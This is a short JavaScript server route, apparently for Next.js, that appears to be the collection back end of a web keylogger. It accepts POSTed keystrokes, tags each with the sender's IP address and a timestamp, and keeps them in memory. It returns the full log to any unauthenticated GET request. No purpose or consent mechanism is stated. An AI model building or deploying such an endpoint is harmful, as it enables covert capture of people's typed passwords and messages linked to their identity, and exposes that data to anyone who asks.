let logs = [];

export default function handler(req, res) {
    if (req.method === 'POST') {
        const { keystroke } = req.body;
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const timestamp = new Date().toISOString();

        const logEntry = {
            timestamp: timestamp,
            clientIp: clientIp,
            keystroke: keystroke
        };

        logs.push(logEntry);

        console.log(logEntry);

        res.status(200).json({ status: 'logged' });
    } else if (req.method === 'GET') {
        res.status(200).json(logs);
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
